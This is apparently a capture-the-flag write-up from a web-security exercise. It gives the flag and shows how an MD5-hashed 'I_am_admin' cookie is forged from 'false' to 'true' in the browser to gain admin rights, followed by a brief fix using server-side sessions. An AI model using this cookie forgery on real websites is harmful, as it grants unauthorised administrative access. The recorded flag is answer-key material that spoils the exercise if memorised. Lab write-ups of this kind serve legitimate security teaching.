# ADMIN COOKIE

## The flag
```
THE FLAG IS : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
```

## How to find it ?
On the page http://{IP_ADDRESS}/
See cookie with document.cookie
```
md5_decrypt('68934a3e9455fa72420237eb05902327')
> false
md5_encrypt('true')
> b326b5062b2f0e69046810717534cb09
document.cookie = "I_am_admin=b326b5062b2f0e69046810717534cb09"
```
Refresh page

## How to use it ?
Become admin of the website

## How to avoid it ?
> Use session cookie so it will be only editable in the back

---

[RETURN](https://github.com/tillderoquefeuil/darkly)